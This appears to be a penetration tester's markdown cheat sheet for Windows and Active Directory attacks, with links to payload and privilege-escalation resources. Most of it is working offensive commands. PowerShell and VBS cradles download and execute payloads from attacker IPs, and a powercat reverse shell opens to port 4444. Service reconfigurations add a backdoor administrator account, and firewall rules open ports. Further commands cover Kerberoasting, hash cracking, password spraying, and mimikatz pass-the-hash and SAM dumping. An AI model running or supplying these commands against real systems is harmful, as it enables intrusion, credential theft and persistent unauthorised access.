
## Reverse Shell Generator

https://www.revshells.com/

https://github.com/ferreirasc/oscp/tree/master/payloads

## One liner reverse shells

https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/

## Windows Privesc Additional Resources

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

https://www.fuzzysecurity.com/tutorials/16.html

## Linux Privesc Additional Resources

https://book.hacktricks.xyz/linux-hardening/privilege-escalation

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

https://guif.re/linuxeop

## File Transfers Additional Resources

https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65

https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/

## Precompiled Binaries / exploits

https://github.com/SecWiki/windows-kernel-exploits

https://github.com/SecWiki/linux-kernel-exploits

## mimikatz

https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa

https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#open-shares

## Powershell Usefull Cradles to Download File

```
powershell.exe -NoP -NonI -Exec Bypass IEX "(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.117/shell443.exe','shell443.exe')"
```

## Powershell Usefull Cradles to Download Script to memory and Execute it

This Example will download Powercat to memory and execute a reverse shell using Powercat without touching the disk

```
powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object System.Net.Webclient).DownloadString("http://172.16.242.173/powercat.ps1"); powercat -c 172.16.242.173 -p 4444 -e cmd.exe
```

You can use this technique to download any script to memory and execute functions from it like Powerview also

```
powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.101.24/powerview.ps1'); Get-DomainController
```

## VBS Cradle to Download Transfer File and Execute it

Transfer exploit.exe from your kali server to the target server and execute it

```
cmd.exe /c "@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.119.142/exploit.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "exploit.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("exploit.exe")>>poc.vbs&cscript.exe poc.vbs"
```

## Reconfigure Service

Reconfigure Service:

```
sc config ServiceName depend= "" start= demand binpath= "C:\Inetpub\wwwroot\shell443.exe" obj= ".\LocalSystem" password= ""
sc config ServiceName binPath= "cmd /c net user haxxor haxxor123 /add && net localgroup Administrators haxxor /add && net localgroup 'Remote Desktop Users' haxxor /add"
```
## Open /Allow Ports in Firewall
Allow Ports 80, 443 and 4444 as Inbound and outbound rules in the firewall (needs admin priveleges)
```
netsh advfirewall firewall add rule action=allow name=tunnelI dir=in protocol=tcp localport='80,443,4444'
netsh advfirewall firewall add rule action=allow name=tunnelO dir=out protocol=tcp remoteport='80,443,4444'
```
## Active Directory Resource

### Import Powerview into memory and execute commands

```
powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.101.24/powerview.ps1'); Get-DomainController
```

### Powerview Reference

https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview

### Active Directory Reference

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md

## Kerberoasting

InvokeKerberoast powershell script will request a service ticket from the DC for the service accounts which you can then copy and crack

```
IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.101.24/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\users\public\HashCapture.txt' -Width 8000
hashcat -m 13100 -o cracked.txt -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

## Password Spraying using crackmapexec

```
crackmapexec smb 192.168.101.0/24 --local-auth -u Administrator -H a0989207854b684f07b5b6fe68169a35
crackmapexec smb 192.168.101.0/24 -u vixx -H 'aad3b435b51404eeaa35b51404ee:a0989207854b684f07b5b6fe68169a35'
```

## OverPass the hash using mimikatz commands

Dump hash and open a cmd shell as vixx using mimikatz(over pass the hash)

```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /user:vixx /domain:vixx.domain /ntlm:a0989207854b684f07b5b6fe68169a35 /run:PowerShell.exe
```

## Dump Local users NTLM hashes using mimikatz

```
privilege::debug
token::elevate
lsadump::sam
```
